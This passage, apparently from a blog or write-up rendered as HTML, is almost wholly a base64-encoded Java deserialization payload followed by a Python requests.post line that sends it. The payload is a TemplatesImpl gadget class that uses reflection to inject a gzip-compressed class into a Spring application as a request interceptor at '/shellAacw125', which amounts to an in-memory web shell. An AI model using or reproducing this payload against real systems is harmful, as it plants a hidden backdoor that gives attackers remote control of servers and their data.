sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKZ2V0Q29udGV4dAEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQARcmVxdWVzdEF0dHJpYnV0ZXMBAAdzZXNzaW9uAQAOc2VydmxldENvbnRleHQBABJhcHBsaWNhdGlvbkNvbnRleHQBABNhcHBsaWNhdGlvbkNvbnRleHRzAQAZTGphdmEvdXRpbC9MaW5rZWRIYXNoU2V0OwEAC2NsYXNzTG9hZGVyAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAA1TdGFja01hcFRhYmxlBwEjBwD3BwDmBwDoBwEnBwEoAQAOZ2V0SW50ZXJjZXB0b3IBAAljbGF6ekJ5dGUBAAJbQgEAC2RlZmluZUNsYXNzAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAVjbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEdmFyOAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwcA&#x2F;wEADmFkZEludGVyY2VwdG9yAQAnKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylWAQAWYWJzdHJhY3RIYW5kbGVyTWFwcGluZwEAE2FkYXB0ZWRJbnRlcmNlcHRvcnMBABVMamF2YS91dGlsL0FycmF5TGlzdDsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQApTGphdmEvdXRpbC9BcnJheUxpc3Q8TGphdmEvbGFuZy9PYmplY3Q7PjsBAAxkZWNvZGVCYXNlNjQBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAMZGVjb2RlckNsYXNzAQAHZGVjb2RlcgEABHZhcjQBAAliYXNlNjRTdHIBABJMamF2YS9sYW5nL1N0cmluZzsBAA5nemlwRGVjb21wcmVzcwEABihbQilbQgEADmNvbXByZXNzZWREYXRhAQADb3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAAmluAQAeTGphdmEvaW8vQnl0ZUFycmF5SW5wdXRTdHJlYW07AQAGdW5nemlwAQAfTGphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtOwEABmJ1ZmZlcgEAAW4BAAFJBwEMBwENBwEPAQAFZ2V0RlYBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEAA29iagEACWZpZWxkTmFtZQEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABGdldEYBAD8oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47BwDkBwEYAQAMaW52b2tlTWV0aG9kAQAMdGFyZ2V0T2JqZWN0AQAKbWV0aG9kTmFtZQEAXShMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzcztbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAAWkBAAdtZXRob2RzAQAbW0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAFdmFyMTEBACFMamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbjsBAAR2YXI5AQAiTGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uOwEABXZhcjEwAQAKcGFyYW1DbGF6egEAEltMamF2YS9sYW5nL0NsYXNzOwEABXBhcmFtAQATW0xqYXZhL2xhbmcvT2JqZWN0OwEABm1ldGhvZAEACXRlbXBDbGFzcwcBKQcAvwcBHwcBIAEAClNvdXJjZUZpbGUBAAtBdnhlcmIuamF2YQEADS9zaGVsbEFhY3cxMjUBAAZBcXdyZ2YBD2xINHNJQUFBQUFBQUFBSTFYQ1h3VTFSMyszaDZaWmJNY0psd1J1UVdTYkpKRkNDQUp0Q1FCSlpLRUl3Z0VySGF5TzBrV05ydkw3R3hDcEJRdlZDbzk3RzN0YlZ2YVlsdUV1a21rS3EydHR2YTBsN1dIUFd4cmF5Mjk3R0dycHQ5N005bHNMZ0R5bTNuNzN2LzgvdGViSjE5NzZCRUFWNGlsQW5rMSs3dk45allOUW1EYVhyMUxEOFgwZUh1b0xxYW5VZzBKUFdLWUd0d0NxeEptZXlpVk5LUHg5alpUN3pTNkUrYStVTGZSR2tvWlpsZk1zRUkxcVo1NGVLTWVqOFFNc3o1dUdXYllTRm9KTW5zRkpyWWIxa1pEeW1vaXE4RFU0cEtHSVZYTmxwUmFMZUNwUzBSNDZxMXBOK0tXRDM2QlNWbkdIWG9zelRPM3J1cytUQlNZSEkxSHJicDB5a3AwYnRGcEVJK0tTM1lJK0RhR1RTTzJWOS9ud3lXVW1LUVhBZ1dqdFFWUWlLa1Q0TUkwZ1NsNlcvaEt2WFg1S24zMTBxV1JwWkhWUHN3UWNCMElCMUJrRTExS25OWklqYStqNW9abzNHaEtkN1lhNW5hOU5XWkk4WW13SHR1aG0xSDUyOW4wV0IxUnF2WTEyUGhTNFdXWTRvY0g4d1V1TFc0WUUrbHE2WUc0VVdER09PZFN5RUlwWkRGcFJ2cFVtNDdHVkxpSy9TaVJhdkwwWk5LSVJ3VEtpMGNETURvQ0RqK1ZCRkVtUlpUVGZDdGhId1lRZ2s5dU1tWGNuWkVWQW9zdlNpaWxMY055UHpHc2xDdUY1a282dVpYWlZyeW50bVNrbzB3RFY3aVZqejIxQXZrUm80MWdxd002VFByNit0RWNBYXpCV2drS2d5TU9DR2lrMjEwaStRdUhTRGNja1BrWVRjUTE4RUNFcVY0Sk9oQUttejFNMUZCZE5ObEI1eG00THQyc0hEd2V3Y3hqUVVzRTAwM3MxbER0cUJnaFJFTURjNzdaMHNQN0d2V2trdy91bWczTlBteW1VOHpwK25qSzB1TmhicGVNaStKSXl3TFlpbTErTktKWllPNHdnbFRTQ0llYURTYSt0Y25vYWVZdkRkY3lyVWNLMXJDVEVhWDYyaDdMb0J1ZVlxSVVRQXQyKzdFTGUyeUV4ekJuaDB5N04vaXhBOWVUU1phQkpLMjNLVk5HT0cxR3JaNFFWU3ZTTjBLWFZqS0dXaVJ4VlRTdXg1aUpNdFJTVndTR1BHd1RtSkEwRGJ0ZENFU0tIWThIbTBtSFpTVkRHL2xvdGplMkdmdlRSc3FxdmlCWktwbUlwNHpxSENjMnQrNDF3bFoxeVc2QmVVTzdkZ0NzcUM2am1wTWJlNGRUeFdKR3V4NnJDWWVOVkNxSGloNkp0dUZ0eFZIREEvcVRHOU50Umx1TUo5RXVZM1BTTUlmcnE1WTFhcHFiMHdSMHJzMFRUWVJrZEdwTVUrL2hmakp0TVFxRzNrbFNMVVVyeUVVVHg4ZEJVY2dzanVpV1RoN1RSazVneVVWQ3pBd3hIUmdISGJrSXdLbXB3Kzc5QW5QT2I1eUdOd2tzdWloak5MeVpmZWJpVE5CdzA3Q1V0d09pNFJhQjJlZEZWc050anBJTEIwekQ3UUZvc2hHNmNDZHpPRHVlQW5nTGx1ZmpNTzRLSUdDZnY1VkloaE54UzQvR1dXdXpoclg4RHQxc2xpNnlCVEF6QTNnNzNpRkw4RzRCUDBVMkQ4WjVRWEhKaFNJZHdMdndicW40UFFJQjhxcGhhRmpTb3ZmWkZyMmZkcmF1ckZ4dmhOVjBuVDVXdzVHbCtRSGNLODMrWUFEclVDTlhIMlpRazNwUGpLUEhoNC9hNG1zc2NyU21MZVBDL2QrcGlBQStqdnZ5Y1FpZnNIdVAwOHdMaThkcTVKL0NjVDl1eGFjNVpVY2NhdmlzZlIzSUdZY0NSYU9sWkNmbC9maWNIeWZ3ZWVuSzRnQ3V4R3E1ZW9CK3BJYjVzV1FNUDhib0greHNwL0ZGNmNpRGpGSnlFT2FVRDcwUzVRZjlPQ0puYm43YzZCN3E3c012T2xsRXp1QkwwclNIZVJQSXliczArMUdua1pOcmp3ck16RFZ1ZTRlWjZKYlR4R25KWC9iakxMN0NIc0pVMG1NcE9WSEhhbndCZkJWZms3QStibWZzVHJackNkNk1RZU5ZR1Z2b3RuTkErNzZPYitUalpqeEorbFM2TmFVd2taa3pmUHBtQi95MzhHMlp2ZDhaSExqRDVXbjRIdTkwM1hJOXdzS2MrZko5L01DUHAvQkRhU1p2R1BsV0lsdXJBVHd0QjlRUi9JU2hhOVZUeHNyS0RmSEJYQjUrZzhoYTlGUDhUQWI3NTFMaGVEWS9LMjMrSldPWlJad0l6aDR4MUJwWlpucTdzVDdhYnZkR04yY3NuNDNyVi9qd1cxYjFlYWcxL0Y3Z2l2R0xaQndkY3N6L3dZL244VWNHTm1iRTI2ME9kYmV0RCtCUGVGSGEvR2NlcEpQczc0WjkxMkZVaU9CZjhGZko5VGNtblJMZnFWc2RvZHBvdTd5THQ4c28vSU5zRWFVamdIOUtSSi9IditSa3JpZUdLcDMrNDhkTGVGbGU5SjZWcS8rcE1GekxLNlJaUjlRRGVGWDJ0VjE0alZydEFEQ0g4dXlBQ0Z3eXhrVk8zcVI0MTNPMUVsaHZsMzJCVngyNkltMUZZeFcxaXRVbjhpaXdMZUY4R2l5NlFGZHhPb1h3aVFrc0llRzNPNlpqajA4RU9KWDNqQ0xYeENRNzlSc05xeVBCQy9HNk1iU01ac3ZWYTlwVElXUkxvQUZUeENYU2dBSW0vWjdSVmFlSnFTemU4ZGcxTVozUVJlTmRpWDEwZWZVWVZUdUd5TEU2aVpncGl2eGlodUQzeVNSRFliRGR1YS83eEdXc2oxUTZYdEVaVFlVcmFtdWFOd3pXRFdHYUk1dUcrdUVUOCtSRnpYRGlLY0cwSndXcEZzcU1NV3lxUmFPbFplbVdzREJ0dXRwMFc1dmNLV0d2WHhPT3FTK21BQ2JMRHgrWEtLUDQ1a1NhSDRaWFJlV3RiK2JWaWNpTjBWaE16L2xjckpBK1lqNXIxd05xaHh0KytRM0dqMVcvL0dCVDcyWHFIZUNLazVoVUUvaHJDdC95bjZjUStTZlZ5aS9uOE9qVFNZT25rOVd1UEMxeVRpY1dvdUEwcGhkaTVtbk1la0J0Q2ZuUjVwQ0YrSmFFM3RKZUxKREhMc3ptTTA5dGxtS09za2tSWUM3bU9jd0xIZWJyU2UzaWUwRnBzQmRMenFDa3BSZWxwekE5ZzRwVG1NVm5CbGYwWWNWcHJCcVNQSW5lQStXVVYwRkVRa3JEZEZ1S28wR3VMc2NpWlJqbm02TnJMYkdUVkJOS2crN2dJNzE0L2NrUnhpN1BFVFVoSzJvQ3FsQ3RSSEgrTzZLZUpvZUg3MkRCbGo1c2J5cS83QjVvbnVQd2VNOWdSNHN5L0xxQ0xiMjRJWU53ZVRDRDlwTk40cVJTc1FURnFLUDlzNVVpTDU5WFV0UnEybHZGazJwK1I2NVJSbFR5TEkrNzY3R0IxQ1UwNlNwY3Jmd09aZzBMWXFNeVRLN3FjUTFwbXJoZUEvY0FnK2pSNE5Ld1NXajhxcENQQVJubW5EMHVHc1VBWnNEdGJFcXFPa3JyUUpTUzZLVExUeHVrcytlQ2ZUamFqMk11UEk3bnN1cyt2QzJEZDk2RHA0TDllSzlBbFNmSXNQWGpIbm55b1NwdmFaSFhuY0ZIcXJ4Rm5vS1A5ZU9UTGp5QkJYSjlCcTZXMGd3K2s4RVhlbkd5eUp2QnFYNWszRGlPSThHQ3ZpSnZQL3JkdkFnY1lTSThWSldYNVQ2TEV4azhVcVVkeCtRcTN4bWNiU255OWVLeFI0dTBvcndNbnRqSnQxZSt5L3J4VFlGVFdPV2VNaVdENzJid295SXRneDg3KzZXUytCa1A3ZXJETDNpV3BaYkV2K0tHKzM3UC9mVCtJSTd4NnJuUGVYYzY4ZHFtNnF1VzhhbkRZa2Fta3JGWnk3alVNeklkZkpxTXdVRkNld3hieU5XRXU3RVo5M0pxM1VmT0Uyakd3OWlPeDNBdG51RUg0d3NjR0M5aXQ0cDFHNnZ1R0hYRWtXRGwzczFmU2V4bmpSN2tieE1wNXNHOWxHU2ZMbVlNTEtTWmZKWEV1WXZ4bHpsMExwc1Q1OUNOQXlvbnpxRUhONnBVUHFja3VWVjJySVQzVlhSb09NU1FEMUNhcHFKL1dNUE5HbTYxdHpWZUtaZ0xkN3lDZk82OWpLYVhLZS9YTW4zNHJtTkdMR09oMkdYQWpGYzV1VlEwRlB5dUR5ODBsakd5MTduNU9KZkIzOC9ncFJaUFdRYi83c1YvSmNDdlpERFFRSmJHb0t3RkYzdERlYllXNXRBMzRBYnU2dlM4RmRNUTVybEJpZ2lydkUzaE5JKzBQdFpFUFg2ai9GcksvSitxU3JnQ3ozRWxsSWVGY0EyUWpWN3Q0cCtkMVRTV054ODdyVVVUQVpXZ0hSSU5oVUxyRS9tTlpZVmlvamdySm1kRVlSbmYwekppVmxNNVU3UlF6UFk4akJNdDdvSk56VHdyNTQ5Ylc5eWxYTTg2aTExMHBicXBVTXhWRW1SdWVvbzhpbWwrTGxPUlp4U1hsN1Z5VXZXOWRiU3RqcG5VeFZnTklyR00zUktxQm1NMHQ1TjdjZEoxOFR4Qnl2M1l4SnpZeXF6b1loYjBNQmNPTXVJU25ZMUVjRFk0bWxTczJiU0VFRkxIVml4U2V4NXlWamg3NjdGS3VKMStja2g0bUVVU3hZUENtMFd4UkhhUk90VVpCbEVjd0FyWlFkUnYxU3I0R0prYS9GWnlVTjd0b0h3MEYrWEx4MFo1c1FQWXJ0RW9iN0wvaUZvTnNTNGVoWFZwTHVzSXJJZDRoeENYMVZySE9yMkZTVDRjOFlNOFBVelRiK0xlemFRN1NzcGJTSGtiRVR5Q25iaWR2KzdrNmc3K3Z5c0g4Ukt4d0VGOG5ZUHVUZ1RWbm9lY2xjN2VOVmliUmZ3b0ViZno5ZzRpWHAyTGVMMlR0NXNjeEtzbDR1cjMySWo3UkRBN2g2OVdSUUVzN0JQbDV4dWtQSDVBVFdIcGU0RWFZNFcwYXlwN3lIeFcxd0lJVVNHdEU2SC9Bek5tdWs4UEZ3QUEMAGMAZAwAdQB2DACGAHYMAJAAkQcBKgwBKwEsDAEtAS4BADxvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5jb250ZXh0LnJlcXVlc3QuUmVxdWVzdENvbnRleHRIb2xkZXIMAS8BMAEAFGdldFJlcXVlc3RBdHRyaWJ1dGVzDAC5AK4BAApnZXRSZXF1ZXN0AQAKZ2V0U2Vzc2lvbgEAEWdldFNlcnZsZXRDb250ZXh0AQBCb3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuY29udGV4dC5zdXBwb3J0LldlYkFwcGxpY2F0aW9uQ29udGV4dFV0aWxzAQAYZ2V0V2ViQXBwbGljYXRpb25Db250ZXh0AQAPamF2YS9sYW5nL0NsYXNzAQAcamF2YXguc2VydmxldC5TZXJ2bGV0Q29udGV4dAEAEGphdmEvbGFuZy9PYmplY3QMALkAvAEAE2phdmEvbGFuZy9FeGNlcHRpb24BADFvcmcuc3ByaW5nZnJhbWV3b3JrLmNvbnRleHQuc3VwcG9ydC5MaXZlQmVhbnNWaWV3DAExAHYMAK0ArgEAF2phdmEvdXRpbC9MaW5rZWRIYXNoU2V0DABxATIHATMMATQAdgEANW9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLmNvbnRleHQuV2ViQXBwbGljYXRpb25Db250ZXh0DAE1ATYMATcBOAwAXwBZDABgAFkMAJcAmAwAngCfAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyBwE5DAE6AIwMATsBPAcBKQwBPQE+DAE&#x2F;AUAMAUEBQgEAE2phdmEvbGFuZy9UaHJvd2FibGUBAAdnZXRCZWFuAQAQamF2YS9sYW5nL1N0cmluZwEAHHJlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmcBABNqYXZhL3V0aWwvQXJyYXlMaXN0DAFDAUQBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyDAFFATABAAxkZWNvZGVCdWZmZXIMAUYBPAEAEGphdmEudXRpbC5CYXNlNjQBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0BABxqYXZhL2lvL0J5dGVBcnJheUlucHV0U3RyZWFtDABjAUcBAB1qYXZhL3V0aWwvemlwL0daSVBJbnB1dFN0cmVhbQwAYwFIDAFJAUoMAUsBTAwBTQFODACzALQHAU8MAVABUQwBUgFTAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDAFUATYMAGMBVQwBVgFXDAFYAFkMAVkBRAwBWgFbAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAVwAWQEAFmNvbS9leGFtcGxlL2V4cC9BdnhlcmIBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uAQAramF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbgEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAC25ld0luc3RhbmNlAQAWKClMamF2YS91dGlsL0l0ZXJhdG9yOwEAEmphdmEvdXRpbC9JdGVyYXRvcgEABG5leHQBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABBpc0Fzc2lnbmFibGVGcm9tAQAUKExqYXZhL2xhbmcvQ2xhc3M7KVoBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQADYWRkAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAHZm9yTmFtZQEACWdldE1ldGhvZAEABShbQilWAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAEcmVhZAEABShbQilJAQAFd3JpdGUBAAcoW0JJSSlWAQALdG9CeXRlQXJyYXkBAAQoKVtCAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1nZXRTdXBlcmNsYXNzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQASZ2V0RGVjbGFyZWRNZXRob2RzAQAdKClbTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAdnZXROYW1lAQAGZXF1YWxzAQARZ2V0UGFyYW1ldGVyVHlwZXMBABQoKVtMamF2YS9sYW5nL0NsYXNzOwEACmdldE1lc3NhZ2UAIQBWAFcAAAAAAA8AAQBYAFkAAQBaAAAALQABAAEAAAADEgGwAAAAAgBbAAAABgABAAAAGABcAAAADAABAAAAAwBdAF4AAAABAF8AWQABAFoAAAAtAAEAAQAAAAMSArAAAAACAFsAAAAGAAEAAAAcAFwAAAAMAAEAAAADAF0AXgAAAAEAYABZAAIAWgAAAC0AAQABAAAAAxIDsAAAAAIAWwAAAAYAAQAAACAAXAAAAAwAAQAAAAMAXQBeAAAAYQAAAAQAAQBiAAEAYwBkAAIAWgAAAGMAAwADAAAAFSq3AAQqtgAFTCq3AAZNKisstgAHsQAAAAIAWwAAABYABQAAACMABAAkAAkAJQAOACYAFAAnAFwAAAAgAAMAAAAVAF0AXgAAAAkADABlAGYAAQAOAAcAZwBmAAIAYQAAAAQAAQAXAAEAaABpAAMAWgAAAD8AAAADAAAAAbEAAAACAFsAAAAGAAEAAAAsAFwAAAAgAAMAAAABAF0AXgAAAAAAAQBqAGsAAQAAAAEAbABtAAIAYQAAAAQAAQBuAG8AAAAJAgBqAAAAbAAAAAEAaABwAAMAWgAAAEkAAAAEAAAAAbEAAAACAFsAAAAGAAEAAAAxAFwAAAAqAAQAAAABAF0AXgAAAAAAAQBqAGsAAQAAAAEAcQByAAIAAAABAHMAdAADAGEAAAAEAAEAbgBvAAAADQMAagAAAHEAAABzAAAAAQB1AHYAAgBaAAABkQAHAAcAAACRuAAItgAJTAFNKxIKtgALEgy4AA06BBkEEg64AA1OLRIPuAANOgUZBRIQuAANOgYrEhG2AAsSEgS9ABNZAysSFLYAC1MEvQAVWQMZBlO4ABZNpwAFOgQsxwA4KxIYtgALtgAZEhq4ABvAABw6BBkEtgAduQAeAQBOKxIftgALLbYAILYAIZkABS1NpwAFOgQssAACAAkAUQBUABcAWgCKAI0AFwADAFsAAABGABEAAAA0AAcANQAJADkAFgA6AB4AOwAmADwALwA9AFEAPwBUAD4AVgBBAFoAQwBtAEQAeABFAIgARgCKAEkAjQBIAI8ATABcAAAAXAAJABYAOwB3AGYABAAmACsAeABmAAUALwAiAHkAZgAGAB4ANgB6AGYAAwBtAB0AewB8AAQAeAAVAHoAZgADAAAAkQBdAF4AAAAHAIoAfQB+AAEACQCIAGUAZgACAH8AAAAwAAX&#x2F;AFQAAwcAgAcAgQcAggABBwCDAfwAMwcAgv8AAgADBwCABwCBBwCCAAEHAIMBAGEAAAAKAAQAhACFAFAAUgACAIYAdgACAFoAAAFUAAYABwAAAHq4AAi2AAlMAU0rKrYAIrYAC7YAGU2nAGNOKrYAI7gAJLgAJToEEiYSJwa9ABNZAxIoU1kEsgApU1kFsgApU7YAKjoFGQUEtgArGQUrBr0AFVkDGQRTWQQDuAAsU1kFGQS+uAAsU7YALcAAEzoGGQa2ABlNpwAFOgQssAACAAkAFQAYABcAGQBzAHYALgADAFsAAAA2AA0AAABQAAcAUQAJAFQAFQBeABgAVQAZAFcAJQBYAEMAWQBJAFoAbQBbAHMAXQB2AFwAeABgAFwAAABIAAcAJQBOAIcAiAAEAEMAMACJAIoABQBtAAYAiwCMAAYAGQBfAI0AjgADAAAAegBdAF4AAAAHAHMAfQB+AAEACQBxAGcAZgACAH8AAAAuAAP&#x2F;ABgAAwcAgAcAgQcAggABBwCD&#x2F;wBdAAQHAIAHAIEHAIIHAIMAAQcAj&#x2F;oAAQBhAAAABAABABcAAQCQAJEAAgBaAAAAvQAHAAUAAAAwKxIvBL0AE1kDEjBTBL0AFVkDEjFTuAAWTi0SMrgAG8AAMzoEGQQstgA0V6cABE6xAAEAAAArAC4AFwAEAFsAAAAaAAYAAABlABkAZgAkAGcAKwBpAC4AaAAvAGsAXAAAADQABQAZABIAkgBmAAMAJAAHAJMAlAAEAAAAMABdAF4AAAAAADAAZQBmAAEAAAAwAGcAZgACAJUAAAAMAAEAJAAHAJMAlgAEAH8AAAAHAAJuBwCDAABvAAAACQIAZQAAAGcAAAAIAJcAmAADAFoAAADqAAYABAAAAHASNbgANkwrEjcEvQATWQMSMFO2ADgrtgAZBL0AFVkDKlO2AC3AACjAACjAACiwTRI5uAA2TCsSOgO9ABO2ADgBA70AFbYALU4ttgAgEjsEvQATWQMSMFO2ADgtBL0AFVkDKlO2AC3AACjAACjAACiwAAEAAAAtAC4AFwADAFsAAAAaAAYAAABwAAYAcQAuAHIALwBzADUAdABIAHUAXAAAADQABQAGACgAmQCMAAEASAAoAJoAZgADAC8AQQCbAI4AAgAAAHAAnACdAAAANQA7AJkAjAABAH8AAAAGAAFuBwCDAGEAAAAKAAQAhABQAIUAUgBvAAAABQEAnAAAAAkAngCfAAMAWgAAANQABAAGAAAAPrsAPFm3AD1MuwA+WSq3AD9NuwBAWSy3AEFOEQEAvAg6BC0ZBLYAQlk2BZsADysZBAMVBbYAQ6f&#x2F;6yu2AESwAAAAAwBbAAAAHgAHAAAAegAIAHsAEQB8ABoAfQAhAIAALQCBADkAhABcAAAAPgAGAAAAPgCgAIgAAAAIADYAoQCiAAEAEQAtAKMApAACABoAJAClAKYAAwAhAB0ApwCIAAQAKgAUAKgAqQAFAH8AAAAcAAL&#x2F;ACEABQcAKAcAqgcAqwcArAcAKAAA&#x2F;AAXAQBhAAAABAABAGIAbwAAAAUBAKAAAAAIAK0ArgADAFoAAABXAAIAAwAAABEqK7gARU0sBLYARiwqtgBHsAAAAAIAWwAAAA4AAwAAAIgABgCJAAsAigBcAAAAIAADAAAAEQCvAGYAAAAAABEAsACdAAEABgALALEAsgACAGEAAAAEAAEAFwBvAAAACQIArwAAALAAAAAIALMAtAADAFoAAADHAAMABAAAACgqtgAgTSzGABksK7YASE4tBLYARi2wTiy2AEpNp&#x2F;&#x2F;puwBJWSu3AEu&#x2F;AAEACQAVABYASQAEAFsAAAAmAAkAAACOAAUAkAAJAJIADwCTABQAlAAWAJUAFwCWABwAlwAfAJoAXAAAADQABQAPAAcAsQCyAAMAFwAFAJsAtQADAAAAKACvAGYAAAAAACgAsACdAAEABQAjAIsAjAACAJUAAAAMAAEABQAjAIsAtgACAH8AAAANAAP8AAUHALdQBwC4CABhAAAABAABAEkAbwAAAAkCAK8AAACwAAAAKAC5AK4AAwBaAAAAQgAEAAIAAAAOKisDvQATA70AFbgAFrAAAAACAFsAAAAGAAEAAACeAFwAAAAWAAIAAAAOALoAZgAAAAAADgC7AJ0AAQBhAAAACAADAFAAUgCFAG8AAAAJAgC6AAAAuwAAACkAuQC8AAMAWgAAAhcAAwAJAAAAyirBABOZAAoqwAATpwAHKrYAIDoEAToFGQQ6BhkFxwBkGQbGAF8sxwBDGQa2AEw6BwM2CBUIGQe+ogAuGQcVCDK2AE0rtgBOmQAZGQcVCDK2AE++mgANGQcVCDI6BacACYQIAaf&#x2F;0KcADBkGKyy2ACo6Baf&#x2F;qToHGQa2AEo6Bqf&#x2F;nRkFxwAMuwBQWSu3AFG&#x2F;GQUEtgArKsEAE5kAGhkFAS22AC2wOge7AFNZGQe2AFS3AFW&#x2F;GQUqLbYALbA6B7sAU1kZB7YAVLcAVb8AAwAlAHIAdQBQAJwAowCkAFIAswC6ALsAUgADAFsAAABuABsAAACiABQAowAXAKQAGwCmACUAqAApAKkAMACrADsArABWAK0AXQCuAGAAqwBmALEAaQCyAHIAtgB1ALQAdwC1AH4AtgCBALkAhgC6AI8AvACVAL0AnAC&#x2F;AKQAwACmAMEAswDFALsAxgC9AMcAXAAAAHoADAAzADMAvQCpAAgAMAA2AL4AvwAHAHcABwDAAMEABwCmAA0AwgDDAAcAvQANAMQAwwAHAAAAygCvAGYAAAAAAMoAuwCdAAEAAADKAMUAxgACAAAAygDHAMgAAwAUALYAiwCMAAQAFwCzAMkAigAFABsArwDKAIwABgB&#x2F;AAAALwAODkMHALf+AAgHALcHAMsHALf9ABcHAMwBLPkABQIIQgcAzQsNVAcAzg5HBwDOAGEAAAAIAAMAUACFAFIAbwAAABEEAK8AAAC7AAAAxQAAAMcAAAABAM8AAAACANBwdAAEYWFhYXB3AQB4dXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAABdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHcEAAAAA3ZyADdjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UckFYRmlsdGVyAAAAAAAAAAAAAAB4cHQAA2Jhcng=&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;requests&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;post&lt;&#x2F;span&gt;&lt;span&gt;(burp0_url&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;headers&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;burp0_headers&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;cookies&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;burp0_cookies&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;data&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;burp0_data)
